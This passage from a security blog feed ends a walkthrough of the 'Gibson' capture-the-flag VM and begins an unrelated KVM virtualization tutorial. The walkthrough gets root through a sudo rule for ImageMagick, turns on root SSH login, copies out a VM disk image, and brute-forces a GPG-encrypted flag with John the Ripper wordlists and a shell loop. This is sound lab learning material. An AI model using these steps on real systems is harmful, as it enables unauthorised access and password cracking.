</pre></td><td class='code'><pre><code class=''><span class='line'># User privilege specification
</span><span class='line'>root    ALL=(ALL:ALL) ALL
</span><span class='line'>
</span><span class='line'>margo    ALL=(ALL:ALL) ALL</span></code></pre></td></tr></table></div></figure>


<p>Also, some other interesting tidbits in the the sudoers file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Allow members of group sudo to execute any command
</span><span class='line'>## disabled after Margo's security incident
</span><span class='line'>##%sudo ALL=(ALL:ALL) ALL
</span><span class='line'>
</span><span class='line'># Allow Margo to convert pictures from the FTP server
</span><span class='line'>margo ALL=(ALL) NOPASSWD: /usr/bin/convert
</span><span class='line'># Allow eugene to manage virtual machines and visudo
</span><span class='line'>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
</span><span class='line'>eugene ALL=(ALL:ALL)  /usr/sbin/visudo</span></code></pre></td></tr></table></div></figure>


<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
</span><span class='line'>convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
</span><span class='line'>convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
</span><span class='line'>margo@gibson:~$ sudo su
</span><span class='line'>[sudo] password for margo: 
</span><span class='line'>root@gibson:/home/margo# </span></code></pre></td></tr></table></div></figure>


<p></p>

<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@gibson:~# virsh list --all
</span><span class='line'> Id    Name                           State
</span><span class='line'>----------------------------------------------------
</span><span class='line'> 2     ftpserv                        running</span></code></pre></td></tr></table></div></figure>


<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /var/lib/libvirt/images/
</span><span class='line'>ftpserv.img</span></code></pre></td></tr></table></div></figure>


<p>To transfer the VM using scp, I first needed to enable SSH&#8217;ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PermitRootLogin yes 
</span><span class='line'>AllowUsers eugene margo root
</span><span class='line'>Match user root
</span><span class='line'>    PasswordAuthentication yes</span></code></pre></td></tr></table></div></figure>


<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
</span><span class='line'>Ubuntu 14.04.3 LTS
</span><span class='line'>root@192.168.217.148's password: 
</span><span class='line'>ftpserv.img                                   100%  512MB  22.6MB/s   00:22    </span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what we have here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file ftpserv.img 
</span><span class='line'>ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors</span></code></pre></td></tr></table></div></figure>


<p>To mount it, we need to learn the offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l ftpserv.img 
</span><span class='line'>Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: dos
</span><span class='line'>Disk identifier: 0x00000000
</span><span class='line'>
</span><span class='line'>Device       Boot Start     End Sectors   Size Id Type
</span><span class='line'>ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)</span></code></pre></td></tr></table></div></figure>


<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir ftpserv
</span><span class='line'>mount -o loop,offset=32256 ftpserv.img ftpserv</span></code></pre></td></tr></table></div></figure>


<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls ftpserv
</span><span class='line'>AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
</span><span class='line'>BOOTSECT.BIN  DOS          GARBAGE       net</span></code></pre></td></tr></table></div></figure>


<p>The GARBAGE directory seems interesting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls GARBAGE/
</span><span class='line'>adminspo.jpg  flag.img  jz_ug.ans</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the picture first:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/gibson/adminspo.jpg" title="sysadmin" alt="sysadmin life"></p>

<p>I also ran exiftool on it and was rewarded with..something:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool adminspo.jpg 
</span><span class='line'>ExifTool Version Number         : 10.60
</span><span class='line'>File Name                       : adminspo.jpg
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 120 kB
</span><span class='line'>File Modification Date/Time     : 2016:05:04 17:17:44-04:00
</span><span class='line'>File Access Date/Time           : 2017:10:01 15:14:34-04:00
</span><span class='line'>File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
</span><span class='line'>File Permissions                : rwxr-xr-x
</span><span class='line'>File Type                       : JPEG
</span><span class='line'>File Type Extension             : jpg
</span><span class='line'>MIME Type                       : image/jpeg
</span><span class='line'>Exif Byte Order                 : Big-endian (Motorola, MM)
</span><span class='line'>Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
</span><span class='line'>Modify Date                     : 2016:05:04 22:29:32
</span><span class='line'>Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
</span><span class='line'>User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<p>Next I looked at the ANS file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file jz_ug.ans 
</span><span class='line'>jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences</span></code></pre></td></tr></table></div></figure>


<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat jz_ug.ans 
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����
</span><span class='line'>    �����������������������������������������������������۲���������������
</span><span class='line'>    �������������������������۲���������� ��������۲�����۲���������������
</span><span class='line'>    ���������������������������������������������������� �����������������
</span><span class='line'>    ޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
</span><span class='line'>     ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
</span><span class='line'>                                  �                            �         �
</span><span class='line'>                    the ugliest of all are under 5 feet tall</span></code></pre></td></tr></table></div></figure>


<p>Hmm, ok. Finally, another image file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file flag.img 
</span><span class='line'>flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121</span></code></pre></td></tr></table></div></figure>


<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount ftpserv/GARBAGE/flag.img flag
</span><span class='line'>ls -la
</span><span class='line'>total 70
</span><span class='line'>drwxr-xr-x 4 root root  1024 May 14  2016 .
</span><span class='line'>drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
</span><span class='line'>-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
</span><span class='line'>-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
</span><span class='line'>-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
</span><span class='line'>drwx------ 2 root root 12288 May  5  2016 lost+found
</span><span class='line'>drwxr-xr-x 2 root root  1024 May  5  2016 .trash</span></code></pre></td></tr></table></div></figure>


<p>Davinci is a snake game:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>     _________         _________             
</span><span class='line'>     /         \       /         \            
</span><span class='line'>    /  /~~~~~\  \     /  /~~~~~\  \           
</span><span class='line'>    |  |     |  |     |  |     |  |           
</span><span class='line'>    |  |     |  |     |  |     |  |           
</span><span class='line'>    |  |     |  |     |  |     |  |         / 
</span><span class='line'>    |  |     |  |     |  |     |  |       //  
</span><span class='line'>   (o  o)    \  \_____/  /     \  \_____/ /   
</span><span class='line'>    \__/      \         /       \        /    
</span><span class='line'>      |        ~~~~~~~~~         ~~~~~~~~         
</span><span class='line'>      ^                               
</span><span class='line'>      Welcome To The Snake Game!          
</span><span class='line'>              Press Any Key To Continue...    
</span></code></pre></td></tr></table></div></figure>


<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat hint.txt 
</span><span class='line'>http://www.imdb.com/title/tt0117951/ and
</span><span class='line'>http://www.imdb.com/title/tt0113243/ have
</span><span class='line'>someone in common... Can you remember his
</span><span class='line'>original nom de plume in 1988...?</span></code></pre></td></tr></table></div></figure>


<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>

<p>And finally, the hidden directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l
</span><span class='line'>total 317
</span><span class='line'>---x------ 1 root root    469 May 14  2016 flag.txt.gpg
</span><span class='line'>-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg</span></code></pre></td></tr></table></div></figure>


<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat tries.txt 
</span><span class='line'>zero cool
</span><span class='line'>zerocool
</span><span class='line'>zero kool
</span><span class='line'>zerokool</span></code></pre></td></tr></table></div></figure>


<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
</span><span class='line'>Created directory: /root/.john
</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class='line'>1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL</span></code></pre></td></tr></table></div></figure>


<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt</span></code></pre></td></tr></table></div></figure>


<p>Now add the rules to John&rsquo;s config file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf</span></code></pre></td></tr></table></div></figure>


<p>Now I was able to generate the file with p@$$w0rd$:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class='line'>132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1</span></code></pre></td></tr></table></div></figure>


<p>And a quick shell script for bruteforcing from the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for pass in $(cat coolpass.txt) ; do
</span><span class='line'>  echo "Trying:" $pass
</span><span class='line'>  gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
</span><span class='line'>  if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
</span><span class='line'>  break
</span><span class='line'>  fi
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>


<p>The correct passphrase is <strong>Z3r0K00l</strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Trying: Z3r0K00l
</span><span class='line'>gpg: CAST5 encrypted data
</span><span class='line'>[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
</span><span class='line'>gpg: encrypted with 1 passphrase
</span><span class='line'>[GNUPG:] BEGIN_DECRYPTION
</span><span class='line'>[GNUPG:] DECRYPTION_INFO 0 3
</span><span class='line'>[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
</span><span class='line'>[GNUPG:] PLAINTEXT_LENGTH 862
</span><span class='line'>[GNUPG:] DECRYPTION_OKAY
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>[GNUPG:] END_DECRYPTION
</span><span class='line'>Passphrase found! Z3r0K00l</span></code></pre></td></tr></table></div></figure>


<p>And the flag is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat flag.txt
</span><span class='line'> _   _            _      _____ _             ____  _                  _   _
</span><span class='line'>| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
</span><span class='line'>| |_| |/ _` |/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _` | '_ \ / _ \ __| |
</span><span class='line'>|  _  | (_| | (__|   &lt;    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
</span><span class='line'>|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Should you not be standing in a 360 degree rotating payphone when reading
</span><span class='line'>this flag...? B-)
</span><span class='line'>
</span><span class='line'>Anyhow, congratulations once more on rooting this VM. This time things were
</span><span class='line'>a bit esoteric, but I hope you enjoyed it all the same.
</span><span class='line'>
</span><span class='line'>Shout-outs again to #vulnhub for hosting a great learning tool. A special
</span><span class='line'>thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
</span><span class='line'>to host the CTF once more.
</span><span class='line'>                                                              --Knightmare</span></code></pre></td></tr></table></div></figure>


<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://imagetragick.com/">ImageTragick</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Q: Why is Christmas just like a day at \
</span><span class='line'>| the office? A: You do all of the work  |
</span><span class='line'>| and the fat guy in the suit            |
</span><span class='line'>|                                        |
</span><span class='line'>\ gets all the credit.                   /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[KVM virtualization on Linux hosts]]></title>
    <link href="http://chousensha.github.io/blog/2017/09/24/kvm-virtualization-on-linux-hosts/"/>
    <updated>2017-09-24T11:34:34-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/09/24/kvm-virtualization-on-linux-hosts</id>
    <content type="html"><![CDATA[<p>By now you probably noticed that the last topics were centered more around Linux than the usual. That&rsquo;s because I am studying for my LFCS certification, and creating posts as I go through the material. This time, we&rsquo;re going to look at using virtualization on a Linux physical host. Since my only physical Linux at the moment is Kali, this is what I&rsquo;m going to use for today&rsquo;s post.</p>

<!-- more -->


<p>The first step before starting anything else, is to check if virtualization is enabled on your machine. For this, you can query your <code>/proc/cpuinfo</code> file and look for the following flags:</p>

<ul>
<li><p><strong>vmx</strong> for Intel CPUs</p></li>
<li><p><strong>svm</strong> for AMD CPUs</p></li>
</ul>


<p>I already knew the result in my case, but I checked anyway with <code>grep &mdash;color vmx /proc/cpuinfo</code>:</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/vmx.png" title="vmx" alt="vmx enabled"></p>

<p>Ok, the next step is to install the virtualization utilities:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install qemu-kvm virt-manager libvirt0 qemu-system virt-viewer virt-top</span></code></pre></td></tr></table></div></figure>


<p>KVM (Kernel Virtual Machine) is a full virtualization solution for Linux on x86 and x64 hardware containing virtualization extensions (Intel VT or AMD-V). It consists of a loadable kernel module, kvm.ko, that provides the core virtualization infrastructure and a processor specific module, kvm-intel.ko or kvm-amd.ko.</p>

<p>libvirt is an API toolkit for managing virtualization hosts</p>

<p>The virt-manager application is a graphical tool for managing virtual machines through libvirt. It primarily targets KVM VMs, but also manages Xen and LXC (linux containers).</p>

<p>virt-viewer allows access to the virtual machine console</p>

<p>virt-top is for monitoring VMs performance</p>

<p>After installing everything, you can go to <code>/etc/libvirt/qemu/networks</code> and look inside the <strong>default.xml</strong> file to see how the default virtual network will be configured:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--
</span><span class='line'>WARNING: THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BE
</span><span class='line'>OVERWRITTEN AND LOST. Changes to this xml configuration should be made using:
</span><span class='line'>  virsh net-edit default
</span><span class='line'>or other application using the libvirt API.
</span><span class='line'>--&gt;
</span><span class='line'>
</span><span class='line'>&lt;network&gt;
</span><span class='line'>  &lt;name&gt;default&lt;/name&gt;
</span><span class='line'>  &lt;uuid&gt;d67cdb82-233e-44f1-a6ac-9293faa2258d&lt;/uuid&gt;
</span><span class='line'>  &lt;forward mode='nat'/&gt;
</span><span class='line'>  &lt;bridge name='virbr0' stp='on' delay='0'/&gt;
</span><span class='line'>  &lt;mac address='52:54:00:b2:a7:6e'/&gt;
</span><span class='line'>  &lt;ip address='192.168.122.1' netmask='255.255.255.0'&gt;
</span><span class='line'>    &lt;dhcp&gt;
</span><span class='line'>      &lt;range start='192.168.122.2' end='192.168.122.254'/&gt;
</span><span class='line'>    &lt;/dhcp&gt;
</span><span class='line'>  &lt;/ip&gt;
</span><span class='line'>&lt;/network&gt;</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see if the default network has been created. Don&rsquo;t forget to start the <strong>libvirtd</strong> daemon first, with <code>systemctl start libvirtd</code> and then use virsh to list the defined networks. <strong>virsh</strong> is a powerful command line interface tool for managing guests and the hypervisor. It can also be used as an interactive prompt.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
